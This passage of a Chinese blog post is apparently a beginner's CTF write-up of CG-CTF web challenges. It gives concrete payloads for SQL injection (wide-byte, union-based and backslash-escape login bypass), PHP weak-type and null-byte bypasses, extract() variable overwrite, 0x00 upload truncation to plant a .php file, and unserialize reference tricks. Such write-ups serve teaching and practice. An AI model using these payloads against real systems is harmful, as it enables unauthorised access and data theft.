class="line">得到第四张表表名为&apos;ctf4&apos;</span><br><span class="line">tips:</span><br><span class="line">1.MySQL的information_schema数据库包含所有数据库的元信息，其中的tables表包含其他数据库的数据库名、表名、表类型、创建时间等许多信息，其中table_schema列为数据库名，table_name列为表名。因为能显示出来的记录有限，所以必须用limit来控制要显示第几条记录，否则只能显示第一条。</span><br><span class="line">2.limit用法是这样LIMIT &#123;[offset,] row_count | row_count OFFSET offset&#125;，必须放在where后面。</span><br><span class="line"></span><br><span class="line">#第四步 从表&apos;ctf4&apos;中查询flag</span><br><span class="line">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=0%df&apos; union select null,flag from ctf4--+</span><br><span class="line">这里的列名&apos;flag&apos;是猜的，也可以从上一步中的information_schema数据库中查询列名，关于列名的信息在information_schema.columns表中的column_name字段。</span><br></pre></td></tr></table></figure><img src="/2018/11/14/CG-CTF-web篇零基础指南/7.jpg"><h2 id="15-x00"><a href="#15-x00" class="headerlink" title="15./x00"></a>15./x00</h2><p>这道题学到了点东西！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">view-source:</span><br><span class="line"></span><br><span class="line">    if (isset ($_GET[&apos;nctf&apos;])) &#123;</span><br><span class="line">        if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&apos;nctf&apos;]) === FALSE)</span><br><span class="line">            echo &apos;必须输入数字才行&apos;;</span><br><span class="line">        else if (strpos ($_GET[&apos;nctf&apos;], &apos;#biubiubiu&apos;) !== FALSE)   </span><br><span class="line">            die(&apos;Flag: &apos;.$flag);</span><br><span class="line">        else</span><br><span class="line">            echo &apos;骚年，继续努力吧啊~&apos;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>要求提交的nctf的值符合正则匹配(一个或多个数字)并且能被strpos()找到<code>#biubiubiu</code></p><p>有两种方法：</p><p>1.ereg()正则函数会把null视为字符串的结束，从而被%00截断，而strpos则可以越过%00 </p><p>所以提交<code>nctf=1%00%23biubiubiu</code>，即可拿到flag</p><p>2.ereg和strpos函数传入数组后返回的都是NULL </p><p>所以提交<code>nctf[]=</code>，拿到flag</p><p>tips:</p><p>由于在PHP中string的实现本质上是一个以字节为单位的数组加上一个声明缓冲区长度的整形，因此string类型可以由任何值构成，即使是“NUL bytes”，但PHP中有些底层库（比如C语言相关的，因为C语言中\0标识字符串的结束）会忽略”a NUL  byte”后面的数据，使用了这些库的函数就是非二进制安全的(non-binary-safe)，ereg就是一个例子，还有很多可以自行百度。 </p><h2 id="16-bypass-again"><a href="#16-bypass-again" class="headerlink" title="16.bypass again"></a>16.bypass again</h2><p>依旧是弱类型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_GET[&apos;a&apos;]) and isset($_GET[&apos;b&apos;])) &#123;</span><br><span class="line">if ($_GET[&apos;a&apos;] != $_GET[&apos;b&apos;])</span><br><span class="line">if (md5($_GET[&apos;a&apos;]) == md5($_GET[&apos;b&apos;]))</span><br><span class="line">die(&apos;Flag: &apos;.$flag);</span><br><span class="line">else</span><br><span class="line">print &apos;Wrong.&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和第二题原理一样</p><p>payload：<a href="http://chinalover.sinaapp.com/web17/index.php?a=QNKCDZO&amp;b=s878926199a" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web17/index.php?a=QNKCDZO&amp;b=s878926199a</a></p><h2 id="17-变量覆盖"><a href="#17-变量覆盖" class="headerlink" title="17.变量覆盖"></a>17.变量覆盖</h2><img src="/2018/11/14/CG-CTF-web篇零基础指南/8.jpg"><p>source.php查看源代码，关键php代码整理后如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) &#123;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">        extract($_POST);</span><br><span class="line">        if ($pass == $thepassword_123) &#123;</span><br><span class="line">?&gt;</span><br><span class="line">            &lt;div class=&quot;alert alert-success&quot;&gt;</span><br><span class="line">            &lt;code&gt;&lt;?php echo $theflag; ?&gt;&lt;/code&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">        &#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>extract() 函数从数组中将变量导入到当前的符号表。</p><p>该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。</p><p>第二个参数 <em>type</em> 用于指定当某个变量已经存在，而数组中又有同名元素时，extract() 函数如何对待这样的冲突。</p><p>该函数返回成功导入到符号表中的变量数目。</p><p>所以这道题给pass和thepassword_123用post传一个相同的值即可</p><img src="/2018/11/14/CG-CTF-web篇零基础指南/9.jpg"><h2 id="18-php是世界上最好的语言"><a href="#18-php是世界上最好的语言" class="headerlink" title="18.php是世界上最好的语言"></a>18.php是世界上最好的语言</h2><p>这道题链接也挂了，我没答上</p><p>参考一下网上的writeup吧</p><p>index.txt核心代码如下 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123;</span><br><span class="line">  echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;);</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br><span class="line">$_GET[id] = urldecode($_GET[id]);</span><br><span class="line">if($_GET[id] == &quot;hackerDJ&quot;)</span><br><span class="line">&#123;</span><br><span class="line">  echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;;</span><br><span class="line">  echo &quot;&lt;p&gt;flag: *****************&#125; &lt;/p&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>eregi()函数判断id是否为hackerDJ，大小写敏感。网页会拒绝任何含有<code>hackerDJ</code>的提交(忽略大小写)，但接受urldecode后为<code>hackerDJ</code>的字符串。</p><p>因为url在传入后台时会自动先进行一次url解码，所以这里需要二次编码</p><p><code>hackerDJ</code>url编码后为<code>%68%61%63%6b%65%72%44%4a</code></p><p>二次编码后为<code>%2568%2561%2563%256b%2565%2572%2544%254a</code></p><p>其中%25是%的url编码</p><h2 id="19-伪装者"><a href="#19-伪装者" class="headerlink" title="19.伪装者"></a>19.伪装者</h2><p>提示管理系统只能在本地登陆</p><p>改了<code>Referer: 127.0.0.1</code>和<code>X-Forwarded-For: 127.0.0.1</code>都没有成功</p><p>看网上的解释好像是服务端代码有问题</p><p>XFF头用以标志客户端真实IP，常用在使用HTTP 代理或者负载均衡服务</p><h2 id="20-header"><a href="#20-header" class="headerlink" title="20.header"></a>20.header</h2><p>链接挂了，flag应该就在数据包的头信息中</p><h2 id="21-上传绕过"><a href="#21-上传绕过" class="headerlink" title="21.上传绕过"></a>21.上传绕过</h2><p>介绍一下文件截断绕过攻击</p><p>1.文件系统0x00截断</p><p>在上传的时候，当文件系统读到【0x00】时，会认为文件已经结束。利用00截断就是利用程序员在写程序时对文件的上传路径过滤不严格，产生0x00上传截断漏洞。通过抓包截断将【evil.php.jpg】后面的一个【.】换成【0x00】。在上传的时候，当文件系统读到【0x00】时，会认为文件已经结束，从而将【evil.php.jpg】的内容写入到【evil.php】中，从而达到攻击的目的。 （0x00是16进制值，不可见。） </p><p>2.PHP%00截断</p><p>原理与15题类似，使用方法与文件系统0x00截断相同</p><p>源码为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;upload.php&quot; method=&quot;post&quot;</span><br><span class="line">enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;label for=&quot;file&quot;&gt;Filename:&lt;/label&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;dir&quot; value=&quot;/uploads/&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt; </span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>后台应该是dir和file连接</p><p>先尝试上传一个1.jpg文件</p><img src="/2018/11/14/CG-CTF-web篇零基础指南/10.jpg"><p>提示上传php文件才行，那上传一个1.php试试</p><img src="/2018/11/14/CG-CTF-web篇零基础指南/11.jpg"><p>提示不被允许的文件类型，使用burp抓一个上传文件的包，尝试filename处截断，发现上传仍然失败。</p><p>尝试在目录处截断，成功。</p><img src="/2018/11/14/CG-CTF-web篇零基础指南/12.jpg"><p>这个地方尝试截断了好几次，发现直接在重放的Raw中改目录名为”/uploads/1.php0x00”或”/uploads/1.php%00”都没有截断成功，最后是要在Hex中直接改为十六进制的00。</p><p>我的做法是先在Raw中现把filename的值“1.php”改为”1.php.jpg”，然后把dir路径改为 /uploads/1.php+</p><img src="/2018/11/14/CG-CTF-web篇零基础指南/13.jpg"><p>我们知道”+”的十六进制值为2b，所以再去Hex中找到+对应的位置把”2b”改成”00”再重新发包。</p><img src="/2018/11/14/CG-CTF-web篇零基础指南/14.jpg"><p>传送门：<a href="https://blog.csdn.net/wy_97/article/details/76549761" target="_blank" rel="noopener">其他文件上传绕过姿势</a></p><h2 id="22-SQL注入1"><a href="#22-SQL注入1" class="headerlink" title="22.SQL注入1"></a>22.SQL注入1</h2><p>直接看源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">    mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  $user = trim($_POST[user]);</span><br><span class="line">  $pass = md5(trim($_POST[pass]));</span><br><span class="line">  $sql=&quot;select user from ctf where (user=&apos;&quot;.$user.&quot;&apos;) and (pw=&apos;&quot;.$pass.&quot;&apos;)&quot;;</span><br><span class="line">    echo &apos;&lt;/br&gt;&apos;.$sql;</span><br><span class="line">  $query = mysql_fetch_array(mysql_query($sql));</span><br><span class="line">  if($query[user]==&quot;admin&quot;) &#123;</span><br><span class="line">      echo &quot;&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  if($query[user] != &quot;admin&quot;) &#123;</span><br><span class="line">    echo(&quot;&lt;p&gt;You are not admin!&lt;/p&gt;&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo $query[user];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>会对传入的参数两端去空格，其中sql构建语句为：<code>select user from ctf where (user=&#39;&quot;.$user.&quot;&#39;) and (pw=&#39;&quot;.$pass.&quot;&#39;)</code> </p><p>直接post个user闭合单引号和括号，再随便传个pass让它存在就可以了。</p><img src="/2018/11/14/CG-CTF-web篇零基础指南/15.jpg"><h2 id="23-pass-check"><a href="#23-pass-check" class="headerlink" title="23.pass check"></a>23.pass check</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$pass=@$_POST[&apos;pass&apos;];</span><br><span class="line">$pass1=***********;//被隐藏起来的密码</span><br><span class="line">if(isset($pass))</span><br><span class="line">&#123;</span><br><span class="line">if(@!strcmp($pass,$pass1))&#123;</span><br><span class="line">echo &quot;flag:nctf&#123;*&#125;&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &quot;the pass is wrong!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &quot;please input pass!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>之前提过的php弱类型，strcmp函数在比较失败，即传入数组时会返回null</p><img src="/2018/11/14/CG-CTF-web篇零基础指南/16.jpg"><h2 id="24-起名字真难"><a href="#24-起名字真难" class="headerlink" title="24.起名字真难"></a>24.起名字真难</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function noother_says_correct($number)</span><br><span class="line">&#123;</span><br><span class="line">       $one = ord(&apos;1&apos;);</span><br><span class="line">       $nine = ord(&apos;9&apos;);</span><br><span class="line">       for ($i = 0; $i &lt; strlen($number); $i++)</span><br><span class="line">       &#123;   </span><br><span class="line">               $digit = ord($number&#123;$i&#125;);</span><br><span class="line">               if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</span><br><span class="line">               &#123;</span><br><span class="line">                       return false;</span><br><span class="line">               &#125;</span><br><span class="line">       &#125;</span><br><span class="line">          return $number == &apos;54975581388&apos;;</span><br><span class="line">&#125;</span><br><span class="line">$flag=&apos;*******&apos;;</span><br><span class="line">if(noother_says_correct($_GET[&apos;key&apos;]))</span><br><span class="line">   echo $flag;</span><br><span class="line">else </span><br><span class="line">   echo &apos;access denied&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><code>int ord ( string $string )</code>函数：返回字符串 string 第一个字符的 ASCII 码值</p><p>分析一下代码，这道题需要传入的key参数中不含有1-9的数字但又等于54975581388，考虑编码解决，发现hex(54975581388)刚好等于0xccccccccc</p><p>因此访问url：<a href="http://chinalover.sinaapp.com/web12/index.php?key=0xccccccccc" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web12/index.php?key=0xccccccccc</a> 就可以拿到flag辣</p><h2 id="25-密码重置"><a href="#25-密码重置" class="headerlink" title="25.密码重置"></a>25.密码重置</h2><p>tip：重置管理员账号：admin 的密码 </p><img src="/2018/11/14/CG-CTF-web篇零基础指南/17.jpg"><p>burp抓个包看看 </p><img src="/2018/11/14/CG-CTF-web篇零基础指南/18.jpg"><p>放到repeater中把post的user参数改成admin，发现url中get还传了个user1参数，看着像base64编码的，解码发现是ctfuser，所以考虑把user1参数修改为admin经过base64编码后的内容。</p><h2 id="26-php反序列化（暂时无法做）"><a href="#26-php反序列化（暂时无法做）" class="headerlink" title="26.php反序列化（暂时无法做）"></a>26.php反序列化（暂时无法做）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class just4fun &#123;</span><br><span class="line">    var $enter;</span><br><span class="line">    var $secret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&apos;pass&apos;])) &#123;</span><br><span class="line">    $pass = $_GET[&apos;pass&apos;];</span><br><span class="line">    </span><br><span class="line">    if(get_magic_quotes_gpc())&#123;</span><br><span class="line">        $pass=stripslashes($pass);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    $o = unserialize($pass);</span><br><span class="line">    </span><br><span class="line">    if ($o) &#123;</span><br><span class="line">        $o-&gt;secret = &quot;*&quot;;</span><br><span class="line">        if ($o-&gt;secret === $o-&gt;enter)</span><br><span class="line">            echo &quot;Congratulation! Here is my secret: &quot;.$o-&gt;secret;</span><br><span class="line">        else</span><br><span class="line">            echo &quot;Oh no... You can&apos;t fool me&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else echo &quot;are you trolling?&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>反序列化后的secret成员被赋予未知的值却要求另一成员enter其值与之相同 </p><p>对象包含的引用在序列化时也会被存储，所以如果enter指向secret的引用，两个成员的值就可以同步变化了 </p><p>在本地写一段代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class just4fun&#123;</span><br><span class="line">    var $secret;</span><br><span class="line">    var $enter ;</span><br><span class="line">&#125;</span><br><span class="line">$f=new just4fun();</span><br><span class="line">$f-&gt;enter=&amp;$f-&gt;secret;</span><br><span class="line">$sf=serialize($f);</span><br><span class="line">print_r($sf);</span><br><span class="line"></span><br><span class="line">$usf=unserialize($sf);</span><br><span class="line">echo &apos;&lt;br/&gt;&apos;;</span><br><span class="line">print_r($usf);</span><br></pre></td></tr></table></figure><p>输出如下：</p><p><code>O:8:&quot;just4fun&quot;:2:{s:6:&quot;secret&quot;;N;s:5:&quot;enter&quot;;R:2;}</code></p><p>所以访问</p><p><code>http://localhost/cgctf2.php?pass=O:8:%22just4fun%22:2:{s:6:%22secret%22;N;s:5:%22enter%22;R:2;}</code></p><img src="/2018/11/14/CG-CTF-web篇零基础指南/20.jpg"><p>php反序列化详细的内容我过几天打完ctf去学php代码审计的时候会整理新的博客的！</p><h2 id="27-SQL-Injection"><a href="#27-SQL-Injection" class="headerlink" title="27.SQL Injection"></a>27.SQL Injection</h2><p>TIP:反斜杠可以用来转义 仔细查看相关函数的用法 </p><p>查看源代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">#GOAL: login as admin,then get the flag;</span><br><span class="line">error_reporting(0);</span><br><span class="line">require &apos;db.inc.php&apos;;</span><br><span class="line"></span><br><span class="line">function clean($str)&#123;</span><br><span class="line">if(get_magic_quotes_gpc())&#123;</span><br><span class="line">$str=stripslashes($str);</span><br><span class="line">&#125;</span><br><span class="line">return htmlentities($str, ENT_QUOTES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = @clean((string)$_GET[&apos;username&apos;]);</span><br><span class="line">$password = @clean((string)$_GET[&apos;password&apos;]);</span><br><span class="line"></span><br><span class="line">$query=&apos;SELECT * FROM users WHERE name=\&apos;&apos;.$username.&apos;\&apos; AND pass=\&apos;&apos;.$password.&apos;\&apos;;&apos;;</span><br><span class="line">$result=mysql_query($query);</span><br><span class="line">if(!$result || mysql_num_rows($result) &lt; 1)&#123;</span><br><span class="line">die(&apos;Invalid password!&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo $flag;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>sql语句：<code>SELECT * FROM users WHERE name=\&#39;&#39;.$username.&#39;\&#39; AND pass=\&#39;&#39;.$password.&#39;\&#39;;</code></p><p>观察clean函数中的返回值经过htmlentities()函数过滤，这个字符将字符转换为 HTML 转义字符 ，第二个参数如果没有默认只转换双引号，但参数值为ENT_QUOTES时查询文档得知既转换双引号又转换单引号。</p><p>我们最终目标是平衡单引号，可是经过这个函数过滤我们无法输入单引号，只能想怎么消灭原来的单引号。</p><p>构造payload：<code>?username=\&amp;password= or 1#</code>使得查询语句如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE name=&apos;\&apos; AND pass=&apos; or 1%23&apos;</span><br><span class="line">即</span><br><span class="line">SELECT * FROM users WHERE </span><br><span class="line">name=&apos;\&apos; AND pass=&apos;            『 [name]的值为 [&apos; AND pass=]，单引号被转义了，显然逻辑值为false 』</span><br><span class="line">or 1                           『 但没关系，[false or 1] 的逻辑值为真 』 </span><br><span class="line">%23&apos;                           『 %23是#的url编码，注释掉多余的单引号 』</span><br><span class="line">即</span><br><span class="line">select * from users where false or 1</span><br></pre></td></tr></table></figure><h2 id="28-综合题"><a href="#28-综合题" class="headerlink" title="28.综合题"></a>28.综合题</h2><p>打开后发现是一串看不懂的代码，google一下是jsfuck编码，<a href="http://www.bugku.com/tools/jsfuck/" target="_blank" rel="noopener">在线解码网站</a></p><p>直接拉到控制台执行，得到 1bc29b36f623ba82aaf6724fd3b16718.php</p><p>打开这个网页得到新的提示</p><img src="/2018/11/14/CG-CTF-web篇零基础指南/21.jpg"><p>根据提示查看http头信息</p><img src="/2018/11/14/CG-CTF-web篇零基础指南/22.jpg"><p>上网搜了一下，发现这是一个linux下保存历史命令的文件，默认保存在/root/.bash_history</p><p>.bash_history详解：<a href="https://yq.aliyun.com/ziliao/75352" target="_blank" rel="noopener">https://yq.aliyun.com/ziliao/75352</a> </p><p>所以尝试打开该目录下这个文件 url：<a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history</a></p><p>得到新的提示</p><img src="/2018/11/14/CG-CTF-web篇零基础指南/23.jpg"><p>这是一个linux解压缩的命令，访问新的url：<a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip可以下载这个压缩文件，用文本编辑器打开该文件得到flag" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip可以下载这个压缩文件，用文本编辑器打开该文件得到flag</a></p><img src="/2018/11/14/CG-CTF-web篇零基础指南/24.jpg"><h2 id="29-system（暂时无法做）"><a href="#29-system（暂时无法做）" class="headerlink" title="29.system（暂时无法做）"></a>29.system（暂时无法做）</h2><p>pass</p><h2 id="30-SQL注入2"><a href="#30-SQL注入2" class="headerlink" title="30.SQL注入2"></a>30.SQL注入2</h2><p>tip：主要考察union查询 </p><p>查看关键源代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">if($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">   mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  $user = $_POST[user];</span><br><span class="line">  $pass = md5($_POST[pass]);</span><br><span class="line">  $query = @mysql_fetch_array(mysql_query(&quot;select pw from ctf where user=&apos;$user&apos;&quot;));</span><br><span class="line">  if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123;</span><br><span class="line">      echo &quot;&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  else &#123;</span><br><span class="line">    echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>strcasecmp(str1, str2)：两个字符串相等则返回0 </p><p>观察一下条件语句 <code>($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))</code></p><p>mysql_fetch_array() 函数返回的关联数组中键为字段名</p><p>构造payload：post一下数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user=&apos; union select &apos;bb23bab64934efa2a4e1666109467f43&apos;#&amp;pass=xiangfeng</span><br><span class="line">//&apos;bb23bab64934efa2a4e1666109467f43&apos;是&apos;xiangfeng&apos;的MD5值</span><br></pre></td></tr></table></figure><p>先用一个单引号把user闭合，然后联合查询xiangfeng的md5值，这样返回的关联数组中pw建的值就是’bb23bab64934efa2a4e1666109467f43’。</p><img src="/2018/11/14/CG-CTF-web篇零基础指南/25.jpg"><h2 id="31-综合题2"><a href="#31-综合题2" class="headerlink" title="31.综合题2"></a>31.综合题2</h2><p>见另一篇博客：<a href="https://www.wxylyw.com/2018/11/13/CG-CTF-%E7%BB%BC%E5%90%88%E9%A2%98-2-writeup/">传送门</a></p><h2 id="32-密码重置2"><a href="#32-密码重置2" class="headerlink" title="32.密码重置2"></a>32.密码重置2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">TIPS:</span><br><span class="line">1.管理员邮箱观察一下就可以找到</span><br><span class="line">2.linux下一般使用vi编辑器，并且异常退出会留下备份文件</span><br><span class="line">3.弱类型bypass</span><br></pre></td></tr></table></figure><p>查看网页源代码得到管理员邮箱：</p><img src="/2018/11/14/CG-CTF-web篇零基础指南/26.jpg"><p>根据提示，学到一个新知识是<a href="https://www.cnblogs.com/DMDD/p/5052048.html" target="_blank" rel="noopener">非正常关闭vi编辑器时会生成一个.swp文件</a></p><p>查看.index.php.swp和.submit.php.swp文件 </p><p>能打开.submit.php.swp文件，关键代码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">if(!empty($token)&amp;&amp;!empty($emailAddress))&#123;</span><br><span class="line">if(strlen($token)!=10) die(&apos;fail&apos;);</span><br><span class="line">if($token!=&apos;0&apos;) die(&apos;fail&apos;);</span><br><span class="line">$sql = &quot;SELECT count(*) as num from `user` where token=&apos;$token&apos; AND email=&apos;$emailAddress&apos;&quot;;</span><br><span class="line">$r = mysql_query($sql) or die(&apos;db error&apos;);</span><br><span class="line">$r = mysql_fetch_assoc($r);</span><br><span class="line">$r = $r[&apos;num&apos;];</span><br><span class="line">if($r&gt;0)&#123;</span><br><span class="line">echo $flag;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &quot;失败了呀&quot;;</span><br><span 